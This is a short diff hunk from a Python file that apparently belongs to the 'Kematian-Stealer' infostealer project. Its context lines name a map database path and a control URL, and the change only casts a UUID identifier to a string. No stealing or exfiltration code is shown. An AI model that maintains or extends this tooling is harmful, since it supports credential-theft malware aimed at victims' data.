@@ -44,7 +44,7 @@ db_path_map = os.path.join(good_dir, "Kematian-Stealer", "map.db")
 
 api_base_url = "https://sped.lol"
 
-identifier = uuid.uuid4()
+identifier = str(uuid.uuid4())
 
 # Notification Handler
 NOTIFICATIONS = Notifications()
